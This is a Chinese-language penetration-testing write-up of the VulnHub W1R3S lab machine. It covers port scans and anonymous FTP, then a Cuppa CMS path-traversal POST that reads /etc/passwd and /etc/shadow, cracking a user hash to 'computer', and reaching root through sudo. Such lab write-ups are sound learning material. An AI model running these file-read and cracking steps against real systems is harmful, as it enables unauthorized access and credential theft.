# <font color="red">靶机信息</font>
W1R3S是vulnhub中的一台中等难度的靶机
# <font color="red">初始侦察</font>
## <font color="yellow">靶机扫描</font>
```
sudo nmap -sT -p- --min-rate 1000 $ip -oA tcpScan
sudo nmap -sU -p- --min-rate 10000 $ip -oA udpScan
```
tcp和udp可以扫描两遍以防止失误

```
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/nmap_scan]
└─# grep open tcpScan.nmap | awk -F'/' '{print $1}' | paste -sd, 
21,22,80,3306
```
`ports=$(grep open tcpScan.nmap | awk -F'/' '{print $1}' | paste -sd,)`
格式化端口方便后续使用

`sudo nmap -sCV -O -sT -p$ports $ip -oA detail`
对上述扫描open的端口进行最详细的一次扫描并保存结果

```
# Nmap 7.95 scan initiated Mon Jul 21 10:50:28 2025 as: /usr/lib/nmap/nmap -sCV -sT -O -p21,22,80,3306 -oA detail 192.168.218.189
Nmap scan report for 192.168.218.189
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.218.148
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:AA:7F:FC (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 4.10 (91%), Linux 4.4 (91%), OpenWrt 19.07 (Linux 4.14) (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 21 10:50:48 2025 -- 1 IP address (1 host up) scanned in 20.49 seconds
                                                                                              
```
同时也可以使用参数--script=vuln进行漏洞扫描，不多展示

# 信息利用
## ftp枚举
```
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─# ftp $ip            
Connected to 192.168.218.189.
220 Welcome to W1R3S.inc FTP service.
Name (192.168.218.189:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> 
``` 
直接使用匿名尝试连接登录，成功登录记得使用二进制传输模式，防止get可执行文件时放生错误，使用prompt关闭交互，使用mget，下载多个文件，将ftp中的所有文件get下来。然后退出。

```
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─# cat *.txt    
New FTP Server For W1R3S.inc
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################
___________.__              __      __  ______________________   _________    .__               
\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\ 
  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ 
  |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                \/     \/         \/                \/       \/        \/  \/         \/     \/ 
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources

01ec2d8fc11c493b25029fb1f47f39ce
        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ

```
查看get下来的文件信息
使用 **hashid** 或者 **hash-identifier**识别字符串 **01ec2d8fc11c493b25029fb1f47f39ce**  的加密算法，大概率是 md5
尝试使用 hashcat 破解一下，结果并没有如愿破解出来
`hashcat -m 0 -a 0 hash.txt rockyou.txt`
在网上的hash破解网站找一下，找了几个网站，还真破解出来了 **01ec2d8fc11c493b25029fb1f47f39ce:This is not a password**

再看下面的base64编码
```
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─# echo "SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==" | base64 -d
It is easy, but not that easy..
```
那么接着往下看，有个员工列表及其职位，可能有用，先做成字典
>The W1R3S.inc employee list
>
>Naomi.W - Manager
>Hector.A - IT Dept
>Joseph.G - Web Design
>Albert.O - Web Design
>Gina.L - Inventory
>Rico.D - Human Resources

下面有一串怪异的文本，直接问ai帮助整理一下，没什么用。
>I don't think this is the way to root!
>... we have a lot of work to do, stop playing around!
## web信息利用
扫描一下目录
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─$ sudo gobuster dir -u http://192.168.218.189 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
[sudo] kali 的密码：
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.189
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 326] [--> http://192.168.218.189/administrator/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.218.189/javascript/]
/index.html           (Status: 200) [Size: 11321]
/wordpress            (Status: 301) [Size: 322] [--> http://192.168.218.189/wordpress/]
/server-status        (Status: 403) [Size: 303]
/index.html           (Status: 200) [Size: 11321]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================

```

有个administrator页面访问一下，应该是在安装cuppa cms时候的前置条件验证

<img width="1919" height="566" alt="Image" src="https://github.com/user-attachments/assets/31dfe747-6f87-449a-b6ba-6f5b442abf2d" />

google搜索了一下好像有一个[文件包含漏洞](https://www.exploit-db.com/exploits/25971 "Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion")在/administrator目录下面，但是没有明确的图文说明，那就继续走完上面的安装前置环境的步骤，但是管理员用户无法创建,怎么改都不行

<img width="1919" height="326" alt="Image" src="https://github.com/user-attachments/assets/a2370901-1550-4970-ab8e-c89b969b24e2" />
没路子了，再研究研究这个漏洞，好像可以利用。但是看不到输出，使用php的伪协议输出试一下，还是没有，也不报错。

<img width="1919" height="1036" alt="Image" src="https://github.com/user-attachments/assets/1b2326d6-b476-4669-b912-afad4e7d7eaf" />

然后我这里卡住了，后面做了参数的fuzz，但是也不行，卡了很久，最后没忍住看了红笔视频，做代码审计，发现是POST提交的。也奇怪为什么get上传参数不报错呢，之后反思的时候，觉得可能是这里，不显示错误信息的问题

<img width="1915" height="170" alt="Image" src="https://github.com/user-attachments/assets/fb16f561-0274-442d-aed3-7660990c2cde" />

然后在使用post提交一下之前的参数
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─$ curl --data 'urlConfig=../../../../../../../../../etc/passwd' http://192.168.218.189/administrator/alerts/alertConfigField.php 
```
有回显了，再看看能不能看其他敏感文件，发现shadow也能看
```
<div id="content_alert_config" class="content_alert_config">
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
    </div>

```


```
<div id="content_alert_config" class="content_alert_config">                                                                                                                                    
        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::                                                                  
daemon:*:17379:0:99999:7:::                                                                                                                                                                         
bin:*:17379:0:99999:7:::                                                                                                                                                                            
sys:*:17379:0:99999:7:::                                                                                                                                                                            
sync:*:17379:0:99999:7:::                                                                                                                                                                           
games:*:17379:0:99999:7:::                                                                                                                                                                          
man:*:17379:0:99999:7:::                                                                                                                                                                            
lp:*:17379:0:99999:7:::                                                                                                                                                                             
mail:*:17379:0:99999:7:::                                                                                                                                                                           
news:*:17379:0:99999:7:::                                                                                                                                                                           
uucp:*:17379:0:99999:7:::                                                                                                                                                                           
proxy:*:17379:0:99999:7:::                                                                                                                                                                          
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::                                                                      
backup:*:17379:0:99999:7:::                                                                                                                                                                         
list:*:17379:0:99999:7:::                                                                                                                                                                           
irc:*:17379:0:99999:7:::                                                                                                                                                                            
gnats:*:17379:0:99999:7:::                                                                                                                                                                          
nobody:*:17379:0:99999:7:::                                                                                                                                                                         
systemd-timesync:*:17379:0:99999:7:::                                                                                                                                                               
systemd-network:*:17379:0:99999:7:::                                                                                                                                                                
systemd-resolve:*:17379:0:99999:7:::                                                                                                                                                                
systemd-bus-proxy:*:17379:0:99999:7:::                                                                                                                                                              
syslog:*:17379:0:99999:7:::                                                                                                                                                                         
_apt:*:17379:0:99999:7:::                                                                                                                                                                           
messagebus:*:17379:0:99999:7:::                                                                                                                                                                     
uuidd:*:17379:0:99999:7:::                                                                                                                                                                          
lightdm:*:17379:0:99999:7:::                                                                                                                                                                        
whoopsie:*:17379:0:99999:7:::                                                                                                                                                                       
avahi-autoipd:*:17379:0:99999:7:::                                                                                                                                                                  
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
    </div>

```

复制下来密码，破解一下。
```
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─# echo '$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.' > hash.txt
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─# cat hash.txt 
$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
└─# john hash.txt                                                            
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
computer         (?)     
1g 0:00:00:00 DONE 2/3 (2025-07-21 14:54) 9.090g/s 2327p/s 2327c/s 2327C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
## ssh登录
使用上面拿到的 w1r3s:computer登录ssh，最后的提权部分就很简单了
```
w1r3s@W1R3S:~$ sudo -l
sudo: unable to resolve host W1R3S
[sudo] password for w1r3s: 
Matching Defaults entries for w1r3s on W1R3S:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S:
    (ALL : ALL) ALL
w1r3s@W1R3S:~$ sudo /bin/bash
sudo: unable to resolve host W1R3S
root@W1R3S:~# sudo -i
^C
root@W1R3S:~# 
root@W1R3S:~# whoami
root
root@W1R3S:~# id
uid=0(root) gid=0(root) groups=0(root)
root@W1R3S:~# 

```

结束整个靶机的渗透
### 反思
结束之后再回看一遍红笔的视频，发现，还是遗漏了很多的信息收集，比如 3306 端口的信息收集，还有后面cms漏洞的利用不足，后面还漏看了www-data用户的利用，还好比较简单，这台靶机主要还是考察信息收集，最开始在枚举web的时候也是差点卡进wordpress中了，卡了很久。